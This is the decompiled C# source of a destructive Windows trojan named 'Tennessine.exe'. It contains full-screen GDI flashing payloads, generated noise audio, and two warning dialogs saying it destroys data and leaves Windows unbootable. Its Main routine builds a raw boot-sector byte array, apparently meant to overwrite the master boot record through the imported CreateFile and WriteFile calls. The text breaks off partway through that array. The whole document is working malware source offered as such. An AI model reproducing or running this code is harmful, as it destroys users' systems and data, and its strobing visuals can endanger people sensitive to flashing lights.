using System;
using System.Diagnostics;
using System.IO;
using System.Media;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

// Token: 0x02000004 RID: 4
internal class Program
{
	// Token: 0x06000003 RID: 3
	[DllImport("kernel32")]
	private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	// Token: 0x06000004 RID: 4
	[DllImport("kernel32")]
	private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberBytesWritten, IntPtr lpOverlapped);

	// Token: 0x06000005 RID: 5
	[DllImport("user32.dll")]
	private static extern int GetSystemMetrics(int nIndex);

	// Token: 0x06000006 RID: 6
	[DllImport("user32.dll")]
	private static extern IntPtr GetDC(IntPtr hWnd);

	// Token: 0x06000007 RID: 7
	[DllImport("user32.dll")]
	private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

	// Token: 0x06000008 RID: 8
	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

	// Token: 0x06000009 RID: 9
	[DllImport("gdi32.dll")]
	private static extern int DeleteDC(IntPtr hdc);

	// Token: 0x0600000A RID: 10
	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateDIBSection(IntPtr hdc, ref Program.BITMAPINFO pbmi, uint iUsage, out IntPtr ppvBits, IntPtr hSection, uint dwOffset);

	// Token: 0x0600000B RID: 11
	[DllImport("gdi32.dll")]
	private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

	// Token: 0x0600000C RID: 12
	[DllImport("gdi32.dll")]
	private static extern bool DeleteObject(IntPtr hObject);

	// Token: 0x0600000D RID: 13
	[DllImport("gdi32.dll")]
	private static extern bool BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);

	// Token: 0x0600000E RID: 14
	[DllImport("gdi32.dll")]
	private static extern bool PatBlt(IntPtr hdc, int x, int y, int w, int h, int rop);

	// Token: 0x0600000F RID: 15
	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateSolidBrush(int crColor);

	// Token: 0x06000010 RID: 16
	[DllImport("gdi32.dll")]
	private static extern int SetDIBitsToDevice(IntPtr hdc, int xDest, int yDest, int w, int h, int xSrc, int ySrc, uint StartScan, uint cLines, IntPtr lpvBits, ref Program.BITMAPINFO lpbmi, uint ColorUse);

	// Token: 0x06000011 RID: 17 RVA: 0x0000206C File Offset: 0x0000026C
	public static void player()
	{
		int num = Program.seedForPlayer;
		Random random = new Random(num ^ Environment.TickCount);
		int num2 = 800000;
		byte[] array = new byte[num2];
		int num3 = 80 + random.Next(90);
		double num4 = 60.0 / (double)num3;
		int num5 = (int)(16000.0 * num4);
		int num6 = 0;
		for (int i = 0; i < num2; i++)
		{
			int num7 = i % num5;
			int num8 = (i * ((i >> 5) | (i >> 7)) >> random.Next(2) + 1) & 64;
			bool flag = num7 == 0;
			int num9;
			if (flag)
			{
				num9 = 255;
			}
			else
			{
				int num10 = num7;
				double num11 = Math.Exp((double)(-(double)num10) / ((double)num5 * 0.06));
				num9 = (int)(255.0 * num11);
			}
			int num12 = ((num7 > num5 / 3 && num7 < num5 / 2) ? ((random.Next(2) == 0) ? 120 : 80) : 0);
			int num13 = ((i >> 5 + random.Next(3)) * (13 & (i >> 8 + random.Next(2)))) & 255;
			int num14 = (i * ((i >> 7 + random.Next(6)) | (i >> 4 + random.Next(5)))) & 255;
			int num15;
			switch (random.Next(6))
			{
			case 0:
				num15 = i * ((i >> 5) | (i >> 8)) >> (i >> 16);
				break;
			case 1:
				num15 = ((i * 5) & (i >> 7)) | ((i * 3) & (i >> 10));
				break;
			case 2:
				num15 = ((i >> 6) | i | (i >> 3)) * 10 + ((i >> 11) & 7);
				break;
			case 3:
				num15 = ((i * 9) & (i >> 4)) | ((i * 5) & (i >> 7));
				break;
			case 4:
				num15 = (i * ((i >> 9) | (i >> 13))) & 255;
				break;
			default:
				num15 = (i >> 4) * (13 & (i >> 7));
				break;
			}
			int num16 = (num9 + num12 + num8 + num13 + num14 + num15) & 255;
			num16 = (num16 >> 1) ^ 128;
			array[i] = (byte)num16;
			bool flag2 = ++num6 > 1000000;
			if (flag2)
			{
				num6 = 0;
			}
		}
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (BinaryWriter binaryWriter = new BinaryWriter(memoryStream))
			{
				int num17 = array.Length;
				int num18 = 36 + num17;
				binaryWriter.Write(Encoding.ASCII.GetBytes("RIFF"));
				binaryWriter.Write(num18);
				binaryWriter.Write(Encoding.ASCII.GetBytes("WAVE"));
				binaryWriter.Write(Encoding.ASCII.GetBytes("fmt "));
				binaryWriter.Write(16);
				binaryWriter.Write(1);
				binaryWriter.Write(1);
				binaryWriter.Write(16000);
				binaryWriter.Write(16000);
				binaryWriter.Write(1);
				binaryWriter.Write(8);
				binaryWriter.Write(Encoding.ASCII.GetBytes("data"));
				binaryWriter.Write(num17);
				binaryWriter.Write(array);
				memoryStream.Position = 0L;
				new SoundPlayer(memoryStream).PlaySync();
			}
		}
	}

	// Token: 0x06000012 RID: 18 RVA: 0x00002410 File Offset: 0x00000610
	private static void drawFullFlash(IntPtr screen, IntPtr[] brushes, int w, int h, int layers, double ft)
	{
		for (int i = 0; i < layers; i++)
		{
			int num = (int)(128.0 + 127.0 * Math.Sin(ft * (7.0 + (double)i) + (double)i));
			int num2 = (int)(128.0 + 127.0 * Math.Sin(ft * (8.3 + (double)i * 0.6) + (double)i * 1.3));
			int num3 = (int)(128.0 + 127.0 * Math.Sin(ft * (9.1 + (double)i * 0.9) + (double)i * 2.1));
			IntPtr intPtr = brushes[(i * 7 + ((num + num2 + num3) & 255)) % brushes.Length];
			IntPtr intPtr2 = Program.SelectObject(screen, intPtr);
			Program.PatBlt(screen, 0, 0, w, h, 5898313);
			Program.SelectObject(screen, intPtr2);
		}
	}

	// Token: 0x06000013 RID: 19 RVA: 0x00002524 File Offset: 0x00000724
	private static void heavyDIBSpinFlash(IntPtr hScreen, int w, int h, int seed)
	{
		Random random = new Random(seed ^ (int)DateTime.Now.Ticks);
		Program.BITMAPINFO bitmapinfo = default(Program.BITMAPINFO);
		bitmapinfo.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(Program.BITMAPINFOHEADER));
		bitmapinfo.bmiHeader.biWidth = w;
		bitmapinfo.bmiHeader.biHeight = -h;
		bitmapinfo.bmiHeader.biPlanes = 1;
		bitmapinfo.bmiHeader.biBitCount = 32;
		bitmapinfo.bmiHeader.biCompression = 0U;
		IntPtr intPtr2;
		IntPtr intPtr = Program.CreateDIBSection(IntPtr.Zero, ref bitmapinfo, 0U, out intPtr2, IntPtr.Zero, 0U);
		int[] array = new int[w * h];
		int num = 0;
		Stopwatch stopwatch = Stopwatch.StartNew();
		while (stopwatch.Elapsed.TotalSeconds < 50.0)
		{
			double totalSeconds = stopwatch.Elapsed.TotalSeconds;
			int num2 = w / 2;
			int num3 = h / 2;
			double num4 = Math.Sin(totalSeconds * 0.8 + (double)num * 0.002) * 3.5;
			double num5 = 6.0 + 6.0 * Math.Sin(totalSeconds * 9.0 + 0.7 * (double)num);
			double num6 = 2.0 + 2.0 * Math.Sin(totalSeconds * 3.3);
			int num7 = 0;
			for (int i = 0; i < h; i++)
			{
				double num8 = (double)(i - num3) / (double)h;
				for (int j = 0; j < w; j++)
				{
					double num9 = (double)(j - num2) / (double)w;
					double num10 = Math.Sqrt(num9 * num9 + num8 * num8);
					double num11 = Math.Atan2(num8, num9);
					double num12 = 0.0045 * Math.Sin((double)(j + i) * 0.013 + totalSeconds * 6.0);
					double num13 = num11 + num4 * (1.0 + 0.45 * num10) + num12;
					double num14 = 1.0 / (0.4 + num10 * 0.9);
					double num15 = Math.Cos(num13) * num10 * num14;
					double num16 = Math.Sin(num13) * num10 * num14;
					double num17 = (num15 + 0.5) * (double)w + 6.0 * Math.Sin(totalSeconds * 12.0 + num10 * 40.0);
					double num18 = (num16 + 0.5) * (double)h + 6.0 * Math.Cos(totalSeconds * 10.0 + num10 * 30.0);
					int num19 = ((int)num17 % w + w) % w;
					int num20 = ((int)num18 % h + h) % h;
					int num21 = (int)(num5 * Math.Sin(totalSeconds * 10.0 + (double)j * 0.0015 + (double)i * 0.0012));
					int num22 = (num19 + num21 + w) % w;
					int num23 = (num19 - num21 + w) % w;
					int num24 = (num22 * 13) & 255;
					int num25 = (num19 * 7) & 255;
					int num26 = (num23 * 11) & 255;
					int num27 = 1 + (int)(num6 * (0.5 + 0.5 * Math.Sin(totalSeconds * 5.0 + (double)j * 0.005)));
					int num28 = num19 / num27 * num27;
					int num29 = num20 / num27 * num27;
					int num30 = ((num28 + num29) * 37) & 255;
					int num31 = num24 * 3 + num30 >> 2;
					int num32 = num25 * 3 + (num30 >> 1) >> 2;
					int num33 = num26 * 3 + (num30 >> 2) >> 2;
					bool flag = (i & 1) == 0;
					if (flag)
					{
						num31 = num31 * 85 / 100;
						num32 = num32 * 85 / 100;
						num33 = num33 * 85 / 100;
					}
					double num34 = 0.5 + 0.5 * Math.Sin(totalSeconds * 40.0 + (double)j * 0.02 + (double)i * 0.014);
					num31 = (int)((double)num31 * (0.6 + 0.4 * num34));
					num32 = (int)((double)num32 * (0.6 + 0.4 * num34));
					num33 = (int)((double)num33 * (0.6 + 0.4 * num34));
					array[num7++] = -16777216 | ((num31 & 255) << 16) | ((num32 & 255) << 8) | (num33 & 255);
				}
			}
			Marshal.Copy(array, 0, intPtr2, array.Length);
			Program.SetDIBitsToDevice(hScreen, 0, 0, w, h, 0, 0, 0U, (uint)h, intPtr2, ref bitmapinfo, 0U);
			int num35 = (int)(4.0 * Math.Sin(totalSeconds * 20.0) + (double)(random.Next(7) - 3));
			int num36 = (int)(4.0 * Math.Cos(totalSeconds * 18.0) + (double)(random.Next(7) - 3));
			Program.BitBlt(hScreen, num35, num36, w, h, hScreen, 0, 0, 6684742);
			for (int k = 0; k < 2 + random.Next(3); k++)
			{
				int num37 = random.Next(9) - 4;
				int num38 = random.Next(9) - 4;
				int num39 = (((k & 1) == 1) ? 15597702 : 8913094);
				Program.BitBlt(hScreen, num37, num38, w, h, hScreen, 0, 0, num39);
			}
			bool flag2 = (num & 7) == 0;
			if (flag2)
			{
				Program.PatBlt(hScreen, 0, 0, w, h, 5898313);
			}
			num++;
		}
		Program.DeleteObject(intPtr);
	}

	// Token: 0x06000014 RID: 20 RVA: 0x00002B30 File Offset: 0x00000D30
	private static void payload2()
	{
		int systemMetrics = Program.GetSystemMetrics(0);
		int systemMetrics2 = Program.GetSystemMetrics(1);
		IntPtr dc = Program.GetDC(IntPtr.Zero);
		IntPtr[] array = new IntPtr[64];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = Program.CreateSolidBrush((i * 37) & 16777215);
		}
		Program.heavyDIBSpinFlash(dc, systemMetrics, systemMetrics2, Program.RAND.Next());
		for (int j = 0; j < array.Length; j++)
		{
			Program.DeleteObject(array[j]);
		}
		Program.ReleaseDC(IntPtr.Zero, dc);
	}

	// Token: 0x06000015 RID: 21 RVA: 0x00002BCC File Offset: 0x00000DCC
	private static void payload3()
	{
		int systemMetrics = Program.GetSystemMetrics(0);
		int systemMetrics2 = Program.GetSystemMetrics(1);
		IntPtr dc = Program.GetDC(IntPtr.Zero);
		Program.BITMAPINFO bitmapinfo = default(Program.BITMAPINFO);
		bitmapinfo.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(Program.BITMAPINFOHEADER));
		bitmapinfo.bmiHeader.biWidth = systemMetrics;
		bitmapinfo.bmiHeader.biHeight = -systemMetrics2;
		bitmapinfo.bmiHeader.biPlanes = 1;
		bitmapinfo.bmiHeader.biBitCount = 32;
		bitmapinfo.bmiHeader.biCompression = 0U;
		IntPtr intPtr2;
		IntPtr intPtr = Program.CreateDIBSection(dc, ref bitmapinfo, 0U, out intPtr2, IntPtr.Zero, 0U);
		int[] array = new int[systemMetrics * systemMetrics2];
		Stopwatch stopwatch = Stopwatch.StartNew();
		int num = 0;
		while (stopwatch.Elapsed.TotalSeconds < 50.0)
		{
			double totalSeconds = stopwatch.Elapsed.TotalSeconds;
			int num2 = systemMetrics / 2;
			int num3 = systemMetrics2 / 2;
			for (int i = 0; i < systemMetrics2; i++)
			{
				int num4 = i * systemMetrics;
				for (int j = 0; j < systemMetrics; j++)
				{
					int num5 = j - num2;
					int num6 = i - num3;
					int num7 = (int)Math.Sqrt((double)(num5 * num5 + num6 * num6));
					int num8 = (int)(Math.Atan2((double)num6, (double)num5) * 1000.0);
					int num9 = ((num5 * 3) ^ (num6 * 5) ^ num8) & 255;
					int num10 = ((num6 * 7) ^ (num5 * 2) ^ (num8 >> 3)) & 255;
					int num11 = ((num7 * 11) ^ (num5 ^ num6)) & 255;
					bool flag = (j ^ i ^ num) % 13 == 0;
					if (flag)
					{
						num9 = 255 - num9;
						num10 = 255 - num10;
						num11 = 255 - num11;
					}
					array[num4 + j] = -16777216 | (num9 << 16) | (num10 << 8) | num11;
				}
			}
			Marshal.Copy(array, 0, intPtr2, array.Length);
			Program.SetDIBitsToDevice(dc, 0, 0, systemMetrics, systemMetrics2, 0, 0, 0U, (uint)systemMetrics2, intPtr2, ref bitmapinfo, 0U);
			for (int k = 0; k < 3; k++)
			{
				Program.BitBlt(dc, (int)(Math.Sin(totalSeconds * (double)(k + 1)) * 8.0), (int)(Math.Cos(totalSeconds * (double)(k + 1)) * 8.0), systemMetrics, systemMetrics2, dc, 0, 0, ((k & 1) == 0) ? 13369376 : 6684742);
			}
			bool flag2 = (num & 1) == 0;
			if (flag2)
			{
				Program.PatBlt(dc, 0, 0, systemMetrics, systemMetrics2, 5898313);
			}
			num++;
		}
		Program.DeleteObject(intPtr);
		Program.ReleaseDC(IntPtr.Zero, dc);
	}

	// Token: 0x06000016 RID: 22 RVA: 0x00002E90 File Offset: 0x00001090
	private static void payload4()
	{
		int systemMetrics = Program.GetSystemMetrics(0);
		int systemMetrics2 = Program.GetSystemMetrics(1);
		IntPtr dc = Program.GetDC(IntPtr.Zero);
		Program.BITMAPINFO bitmapinfo = default(Program.BITMAPINFO);
		bitmapinfo.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(Program.BITMAPINFOHEADER));
		bitmapinfo.bmiHeader.biWidth = systemMetrics;
		bitmapinfo.bmiHeader.biHeight = -systemMetrics2;
		bitmapinfo.bmiHeader.biPlanes = 1;
		bitmapinfo.bmiHeader.biBitCount = 32;
		bitmapinfo.bmiHeader.biCompression = 0U;
		IntPtr intPtr2;
		IntPtr intPtr = Program.CreateDIBSection(dc, ref bitmapinfo, 0U, out intPtr2, IntPtr.Zero, 0U);
		int[] array = new int[systemMetrics * systemMetrics2];
		Stopwatch stopwatch = Stopwatch.StartNew();
		int num = 0;
		while (stopwatch.Elapsed.TotalSeconds < 50.0)
		{
			double totalSeconds = stopwatch.Elapsed.TotalSeconds;
			int num2 = Program.RAND.Next();
			for (int i = 0; i < systemMetrics2; i++)
			{
				for (int j = 0; j < systemMetrics; j++)
				{
					int num3 = (j ^ (int)(totalSeconds * 37.0) ^ num2) & 255;
					int num4 = (i ^ (int)(totalSeconds * 53.0) ^ (num2 >> 3)) & 255;
					int num5 = (num3 * ((j | i) & 31)) & 255;
					int num6 = (num4 * (j & i & 63)) & 255;
					int num7 = ((num3 + num4 + j) * (i + (num2 & 127))) & 255;
					bool flag = (j + i + num) % 17 == 0;
					if (flag)
					{
						num5 ^= 127;
						num6 ^= 63;
						num7 ^= 31;
					}
					array[i * systemMetrics + j] = -16777216 | (num5 << 16) | (num6 << 8) | num7;
				}
			}
			Marshal.Copy(array, 0, intPtr2, array.Length);
			Program.SetDIBitsToDevice(dc, 0, 0, systemMetrics, systemMetrics2, 0, 0, 0U, (uint)systemMetrics2, intPtr2, ref bitmapinfo, 0U);
			for (int k = 0; k < 4; k++)
			{
				Program.BitBlt(dc, (int)(Math.Sin(totalSeconds * ((double)k + 2.3)) * 12.0), (int)(Math.Cos(totalSeconds * ((double)k + 1.7)) * 12.0), systemMetrics, systemMetrics2, dc, 0, 0, 15597702);
			}
			bool flag2 = (num & 3) == 0;
			if (flag2)
			{
				Program.PatBlt(dc, 0, 0, systemMetrics, systemMetrics2, 5898313);
			}
			num++;
		}
		Program.DeleteObject(intPtr);
		Program.ReleaseDC(IntPtr.Zero, dc);
	}

	// Token: 0x06000017 RID: 23 RVA: 0x0000314C File Offset: 0x0000134C
	private static void payload5()
	{
		int systemMetrics = Program.GetSystemMetrics(0);
		int systemMetrics2 = Program.GetSystemMetrics(1);
		IntPtr dc = Program.GetDC(IntPtr.Zero);
		Program.BITMAPINFO bitmapinfo = default(Program.BITMAPINFO);
		bitmapinfo.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(Program.BITMAPINFOHEADER));
		bitmapinfo.bmiHeader.biWidth = systemMetrics;
		bitmapinfo.bmiHeader.biHeight = -systemMetrics2;
		bitmapinfo.bmiHeader.biPlanes = 1;
		bitmapinfo.bmiHeader.biBitCount = 32;
		bitmapinfo.bmiHeader.biCompression = 0U;
		IntPtr intPtr2;
		IntPtr intPtr = Program.CreateDIBSection(dc, ref bitmapinfo, 0U, out intPtr2, IntPtr.Zero, 0U);
		int[] array = new int[systemMetrics * systemMetrics2];
		Stopwatch stopwatch = Stopwatch.StartNew();
		int num = 0;
		while (stopwatch.Elapsed.TotalSeconds < 50.0)
		{
			double totalSeconds = stopwatch.Elapsed.TotalSeconds;
			for (int i = 0; i < systemMetrics2; i++)
			{
				for (int j = 0; j < systemMetrics; j++)
				{
					int num2 = (j * j + i * i + (int)(totalSeconds * 100.0)) & 255;
					int num3 = ((j * 3) ^ (i * 5) ^ (int)(totalSeconds * 61.0)) & 255;
					int num4 = ((num2 << 1) ^ (num3 >> 1) ^ (j + i)) & 255;
					bool flag = (j ^ i ^ num) % 11 == 0;
					if (flag)
					{
						num4 = 255 - num4;
					}
					array[i * systemMetrics + j] = -16777216 | (num2 << 16) | (num3 << 8) | num4;
				}
			}
			Marshal.Copy(array, 0, intPtr2, array.Length);
			Program.SetDIBitsToDevice(dc, 0, 0, systemMetrics, systemMetrics2, 0, 0, 0U, (uint)systemMetrics2, intPtr2, ref bitmapinfo, 0U);
			int num5 = 2 + (num & 3);
			for (int k = 0; k < num5; k++)
			{
				Program.BitBlt(dc, (k - 1) * (num & 7), (k - 1) * ((num >> 1) & 7), systemMetrics, systemMetrics2, dc, 0, 0, ((k & 1) == 0) ? 13369376 : 8913094);
			}
			bool flag2 = (num & 5) == 0;
			if (flag2)
			{
				Program.PatBlt(dc, 0, 0, systemMetrics, systemMetrics2, 5898313);
			}
			num++;
		}
		Program.DeleteObject(intPtr);
		Program.ReleaseDC(IntPtr.Zero, dc);
	}

	// Token: 0x06000018 RID: 24 RVA: 0x000033B8 File Offset: 0x000015B8
	private static void payload6()
	{
		int systemMetrics = Program.GetSystemMetrics(0);
		int systemMetrics2 = Program.GetSystemMetrics(1);
		IntPtr dc = Program.GetDC(IntPtr.Zero);
		IntPtr[] array = new IntPtr[32];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = Program.CreateSolidBrush(Program.RGB((i * 71) & 255, (i * 133) & 255, (i * 197) & 255));
		}
		Stopwatch stopwatch = Stopwatch.StartNew();
		int num = 0;
		while (stopwatch.Elapsed.TotalSeconds < 50.0)
		{
			double totalSeconds = stopwatch.Elapsed.TotalSeconds;
			for (int j = 0; j < 4 + (num & 3); j++)
			{
				IntPtr intPtr = array[j * (num + 3) % array.Length];
				IntPtr intPtr2 = Program.SelectObject(dc, intPtr);
				Program.PatBlt(dc, (int)(Math.Sin(totalSeconds * ((double)j + 1.3)) * 80.0), (int)(Math.Cos(totalSeconds * ((double)j + 0.7)) * 40.0), systemMetrics / (1 + j), systemMetrics2 / (1 + j), 15597702);
				Program.SelectObject(dc, intPtr2);
			}
			for (int k = 0; k < 3; k++)
			{
				Program.BitBlt(dc, (int)(Math.Sin(totalSeconds * ((double)k + 0.9)) * 12.0), (int)(Math.Cos(totalSeconds * ((double)k + 1.1)) * 12.0), systemMetrics, systemMetrics2, dc, 0, 0, 6684742);
			}
			bool flag = (num & 2) == 0;
			if (flag)
			{
				Program.PatBlt(dc, 0, 0, systemMetrics, systemMetrics2, 5898313);
			}
			num++;
		}
		for (int l = 0; l < array.Length; l++)
		{
			Program.DeleteObject(array[l]);
		}
		Program.ReleaseDC(IntPtr.Zero, dc);
	}

	// Token: 0x06000019 RID: 25 RVA: 0x000035D0 File Offset: 0x000017D0
	private static void payload7()
	{
		int systemMetrics = Program.GetSystemMetrics(0);
		int systemMetrics2 = Program.GetSystemMetrics(1);
		IntPtr dc = Program.GetDC(IntPtr.Zero);
		Program.BITMAPINFO bitmapinfo = default(Program.BITMAPINFO);
		bitmapinfo.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(Program.BITMAPINFOHEADER));
		bitmapinfo.bmiHeader.biWidth = systemMetrics;
		bitmapinfo.bmiHeader.biHeight = -systemMetrics2;
		bitmapinfo.bmiHeader.biPlanes = 1;
		bitmapinfo.bmiHeader.biBitCount = 32;
		bitmapinfo.bmiHeader.biCompression = 0U;
		IntPtr intPtr2;
		IntPtr intPtr = Program.CreateDIBSection(dc, ref bitmapinfo, 0U, out intPtr2, IntPtr.Zero, 0U);
		int[] array = new int[systemMetrics * systemMetrics2];
		Stopwatch stopwatch = Stopwatch.StartNew();
		int num = 0;
		while (stopwatch.Elapsed.TotalSeconds < 50.0)
		{
			double totalSeconds = stopwatch.Elapsed.TotalSeconds;
			int num2 = Program.RAND.Next();
			for (int i = 0; i < systemMetrics2; i++)
			{
				int num3 = i * systemMetrics;
				for (int j = 0; j < systemMetrics; j++)
				{
					int num4 = (j * 31 + num2) & 255;
					int num5 = (i * 17 + num2 >> 3) & 255;
					int num6 = (num4 ^ (num5 + (int)(totalSeconds * 12.0))) & 255;
					int num7 = (num5 ^ (num4 + (int)(totalSeconds * 7.0))) & 255;
					int num8 = ((num4 + num5) ^ (j ^ i)) & 255;
					array[num3 + j] = -16777216 | (num6 << 16) | (num7 << 8) | num8;
				}
			}
			Marshal.Copy(array, 0, intPtr2, array.Length);
			Program.SetDIBitsToDevice(dc, 0, 0, systemMetrics, systemMetrics2, 0, 0, 0U, (uint)systemMetrics2, intPtr2, ref bitmapinfo, 0U);
			for (int k = 0; k < 6; k++)
			{
				Program.BitBlt(dc, ((k & 1) == 0) ? 4 : (-4), ((k & 1) == 0) ? (-3) : 3, systemMetrics, systemMetrics2, dc, 0, 0, (k % 2 == 0) ? 13369376 : 15597702);
			}
			bool flag = (num & 1) == 0;
			if (flag)
			{
				Program.PatBlt(dc, 0, 0, systemMetrics, systemMetrics2, 5898313);
			}
			num++;
		}
		Program.DeleteObject(intPtr);
		Program.ReleaseDC(IntPtr.Zero, dc);
	}

	// Token: 0x0600001A RID: 26 RVA: 0x0000383C File Offset: 0x00001A3C
	private static void payload8()
	{
		int systemMetrics = Program.GetSystemMetrics(0);
		int systemMetrics2 = Program.GetSystemMetrics(1);
		IntPtr dc = Program.GetDC(IntPtr.Zero);
		IntPtr[] array = new IntPtr[48];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = Program.CreateSolidBrush(Program.RGB((i * 97) & 255, (i * 59) & 255, (i * 43) & 255));
		}
		Program.BITMAPINFO bitmapinfo = default(Program.BITMAPINFO);
		bitmapinfo.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(Program.BITMAPINFOHEADER));
		bitmapinfo.bmiHeader.biWidth = systemMetrics;
		bitmapinfo.bmiHeader.biHeight = -systemMetrics2;
		bitmapinfo.bmiHeader.biPlanes = 1;
		bitmapinfo.bmiHeader.biBitCount = 32;
		bitmapinfo.bmiHeader.biCompression = 0U;
		IntPtr intPtr2;
		IntPtr intPtr = Program.CreateDIBSection(dc, ref bitmapinfo, 0U, out intPtr2, IntPtr.Zero, 0U);
		int[] array2 = new int[systemMetrics * systemMetrics2];
		Stopwatch stopwatch = Stopwatch.StartNew();
		int num = 0;
		while (stopwatch.Elapsed.TotalSeconds < 50.0)
		{
			double totalSeconds = stopwatch.Elapsed.TotalSeconds;
			for (int j = 0; j < systemMetrics2; j++)
			{
				for (int k = 0; k < systemMetrics; k++)
				{
					int num2 = ((k * (int)(Math.Sin(totalSeconds * 3.14) * 13.0) + j * (int)(Math.Cos(totalSeconds * 2.71) * 7.0)) ^ (num * 13)) & 255;
					array2[j * systemMetrics + k] = -16777216 | (num2 << 16) | (255 - num2 << 8) | (num2 ^ (num & 255));
				}
			}
			Marshal.Copy(array2, 0, intPtr2, array2.Length);
			Program.SetDIBitsToDevice(dc, 0, 0, systemMetrics, systemMetrics2, 0, 0, 0U, (uint)systemMetrics2, intPtr2, ref bitmapinfo, 0U);
			for (int l = 0; l < 4; l++)
			{
				IntPtr intPtr3 = array[(num + l) % array.Length];
				IntPtr intPtr4 = Program.SelectObject(dc, intPtr3);
				Program.PatBlt(dc, (int)(Math.Sin(totalSeconds * (double)(l + 1)) * 120.0), (int)(Math.Cos(totalSeconds * (double)(l + 1)) * 80.0), systemMetrics / (l + 1), systemMetrics2 / (l + 1), 15597702);
				Program.SelectObject(dc, intPtr4);
			}
			bool flag = (num & 4) == 0;
			if (flag)
			{
				Program.PatBlt(dc, 0, 0, systemMetrics, systemMetrics2, 5898313);
			}
			num++;
		}
		for (int m = 0; m < array.Length; m++)
		{
			Program.DeleteObject(array[m]);
		}
		Program.DeleteObject(intPtr);
		Program.ReleaseDC(IntPtr.Zero, dc);
	}

	// Token: 0x0600001B RID: 27 RVA: 0x00003B2D File Offset: 0x00001D2D
	private static int RGB(int r, int g, int b)
	{
		return (r & 255) | ((g & 255) << 8) | ((b & 255) << 16);
	}

	// Token: 0x0600001C RID: 28 RVA: 0x00003B4C File Offset: 0x00001D4C
	private static bool Warnings()
	{
		bool flag = MessageBox.Show("you are about to run a malware called the Tennessine.exe Trojan.\n\r\nby running this program into clicking yes, then you accept the risk of the damage you cause, this will cause data loss and makes your computer likely unbootable.\nif you see this malware, DO NOT RUN THIS PROGRAM BUT IT DAMAGES ALL YOUR DATA AND THEN YOUR DATA BELONGS TO THE TRASH.\nif you dont know what this malware does click no to make your computer safe.\n\r\nalso ask Kavru/Koza to let you run it or if you dont have a VM Then you wont run this malware.\n\r\nARE YOU SURE YOU REALLY WANT TO EXECUTE THIS?\nyoull never be able to use windows again without any recovery methods also it countains flashing lights and loud noises.", "Tennessine.exe - Made by Kavru and Koza/x0r", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.No;
		if (flag)
		{
			Environment.Exit(0);
		}
		bool flag2 = MessageBox.Show("THIS IS YOUR FINAL WARNING.\n\r\nif you read the forbidden warning then KEEP IN MIND YOUR COMPUTER IS GOING TO BE DESTROYED.\nclicking yes destroys your computer.\nyou wont be able to use windows again.\n the creator Koza/x0r/Kavru is not responsible for any data loss or damages to your computer\n\r\nare you sure you really like to execute it still?", "Tennessine.exe - FINAL WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.No;
		if (flag2)
		{
			Environment.Exit(0);
		}
		return true;
	}

	// Token: 0x0600001D RID: 29 RVA: 0x00003BA0 File Offset: 0x00001DA0
	private static void Main()
	{
		for (;;)
		{
			bool flag = !Program.Warnings();
			if (flag)
			{
				break;
			}
			byte[] array = new byte[]
			{
				49, 192, 142, 216, 184, 19, 0, 205, 16, 184,
				0, 160, 142, 192, 139, 14, 86, 124, 49, byte.MaxValue,
				187, 0, 0, 137, 216, 137, 202, 49, 208, 193,
				232, 2, 137, 198, 83, 185, 64, 1, 137, 200,
				1, 216, 49, 240, 1, 200, 49, 216, 209, 232,
				1, 240, 48, 232, 0, 216, 48, 200, 208, 232,
				0, 248, 50, 6, 86, 124, 38, 136, 5, 71,
				226, 222, 91, 67, 129, 251, 200, 0, 117, 199,
				byte.MaxValue, 6, 86, 124, 235, 184, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
